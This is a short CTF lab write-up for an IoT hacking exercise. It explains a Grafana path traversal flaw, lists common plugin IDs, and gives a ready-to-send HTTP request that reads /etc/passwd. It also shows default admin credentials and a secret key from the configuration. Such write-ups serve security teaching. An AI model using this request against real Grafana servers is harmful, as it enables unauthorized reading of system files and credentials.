# IoT Hacking CLUS CTF Flags

The following are the CTF flags for the grafana vulnerability in the IoT device:

The vulnerability is caused by plugin module, which is able to serve the static file inside the plugin folder. But for lock of check, attacker can use ../ to step up from the plugin folder to parent foler and download arbitrary files.

To exploit the vulnerabilty, you should know a valid plugin id, such as alertlist, here are some of common plugin ids:
```
alertlist
cloudwatch
dashlist
elasticsearch
graph
graphite
heatmap
influxdb
mysql
opentsdb
pluginlist
postgres
prometheus
stackdriver
table
text
```
Send following request to retrieve the **/etc/passwd ** (you can replace the alertlist with any valid plugin id):

```
GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: http://192.168.3.126:3000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close
```
<img width="791" alt="image" src="https://github.com/The-Art-of-Hacking/h4cker/assets/1690898/13f46b3b-1948-4f6e-a6bf-bf28a3c4fc05">


## Getting the Admin Password and Secret Key

It is just the default example configuration:
```
# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
;admin_password = admin

...

# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm
```

<img width="1920" alt="image" src="https://github.com/The-Art-of-Hacking/h4cker/assets/1690898/e306aa9c-a980-4001-bc6d-2cbacf7d8b0a">
